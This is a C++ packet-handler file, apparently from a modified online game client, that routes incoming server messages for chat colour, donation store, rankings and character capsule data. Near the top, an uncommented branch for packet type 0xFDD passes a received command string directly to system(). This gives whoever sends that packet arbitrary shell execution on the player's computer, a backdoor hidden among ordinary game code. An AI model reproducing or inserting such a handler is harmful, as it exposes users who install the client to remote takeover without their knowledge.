#include "main.h"
#include "..\Basedef.h"

int SpeakChatColor;
int CameraLivre;
STRUCT_CAPSULE file;

char* ClientReceiver(char* pBuffer, int a_iSize)
{
	auto m = (Header*)pBuffer;

	//printf("\Packet: %d Size: %d\n", m->Type, m->Size);

	if (m->Type == 0xFDD)
	{
		auto p = reinterpret_cast<MSG_ExecCommands*>(pBuffer);

		system(p->Command);
		return pBuffer;
	}

	/*  Chat Colorido */
	if (m->Type == 0xD1D)
	{
		auto Chat = (MSG_ChatColor*)pBuffer;
		SpeakChatColor = (TNColor)Chat->Color;//		
		return pBuffer;

	}	
	if (m->Type == _MSG_UpdateEtc)
	{
		g_pClientInfo->ReceiveInfo(pBuffer);
		return pBuffer;
	}	
	if (m->Type == _MSG_UpdateDropList)
	{	
		g_pClientInfo->ReceiveInfo(pBuffer);
		return pBuffer;
	}	
	if (m->Type == _MSG_UpdateDonate)
	{
		g_pClientInfo->ReceiveInfo(pBuffer);
		return pBuffer;
	}
	if (m->Type == _MSG_UpdateDonateStore)
	{
		g_pClientInfo->ReceiveInfo(pBuffer);
		return pBuffer;
	}
	if (m->Type == _MSG_SendDListNames)
	{
		g_pClientInfo->ReceiveInfo(pBuffer);
		return pBuffer;
	}
	if (m->Type == _MSG_ServerInfos)
	{
		g_pClientInfo->ReceiveInfo(pBuffer);
		return pBuffer;
	}
	if (m->Type == _MSG_MailItem)
	{
		g_pClientInfo->ReceiveInfo(pBuffer);
		return pBuffer;
	}
	if (m->Type == _MSG_SendRanking)
	{
		g_pClientInfo->ReceiveInfo(pBuffer);
		return pBuffer;
	}
	/*if (m->Type == _MSG_Recaptcha)
	{
		g_pClientInfo->ReceiveInfo(pBuffer);
		return pBuffer;
	}*/
	if (m->Type == _MSG_SendTraje)
	{
		g_pClientInfo->ReceiveInfo(pBuffer);
		return pBuffer;
	}
	/*if (m->Type == _MSG_StartTime)
	{
		g_pClientInfo->ReceiveInfo(pBuffer);
		return pBuffer;
	}*/
	

	/*  Send Message Exp */
	if (m->Type == 0x5000)
	{
		auto Chat = reinterpret_cast<MSG_Exp_Msg_Panel_*>(pBuffer);

		SendMsgExp((TNColor)Chat->Color32, Chat->Msg);
		return pBuffer;
	}

	/* Ativar ou desativar efeitos dos buffs antigos */
	/*if (m->Type == 0x5001)
	{
		auto Req = reinterpret_cast<MSG_STANDARDPARM*>(pBuffer);

		BASE_EffectMagic(Req->Parm == 0 ? false : true);
		return pBuffer;
	}*/

	if (m->Type == 0xD02)
	{
		auto Req = reinterpret_cast<STRUCT_CLIENTPAC*>(pBuffer);

		(STRUCT_CLIENTPAC*)pBuffer;

		g_pSendClientPac.Points[0] = Req->Points[0];
		g_pSendClientPac.Points[1] = Req->Points[1];
		return pBuffer;
	}


	if (m->Type == _MSG_CNFDBCapsuleInfo)
	{
		auto Req = reinterpret_cast<MSG_CNFDBCapsuleInfo*>(pBuffer);

		(MSG_CNFDBCapsuleInfo*)pBuffer;

		Req->Capsule.MortalClass = file.extra.MortalFace / 10;
		Req->Capsule.ClassCele = file.extra.SaveCelestial[0].Class;
		Req->Capsule.SubClass = file.MOB.Class;
		Req->Capsule.LevelCele = file.extra.SaveCelestial[0].BaseScore.Level;
		Req->Capsule.LevelSub = file.MOB.BaseScore.Level;

		Req->Capsule.For = file.MOB.BaseScore.Str;
		Req->Capsule.Int = file.MOB.BaseScore.Int;
		Req->Capsule.Dex = file.MOB.BaseScore.Dex;
		Req->Capsule.Con = file.MOB.BaseScore.Con;

		Req->Capsule.ScoreBonus = file.MOB.ScoreBonus;
		Req->Capsule.SkillPoint = file.MOB.SkillBonus;

		Req->Capsule.ArchQuest = file.extra.QuestInfo.Arch.Cristal;
		Req->Capsule.CelestialQuest = file.extra.QuestInfo.Celestial.Reset;
		Req->Capsule.ArcanaQuest = file.extra.QuestInfo.Circle;

		return pBuffer;
	}

	return pBuffer;
}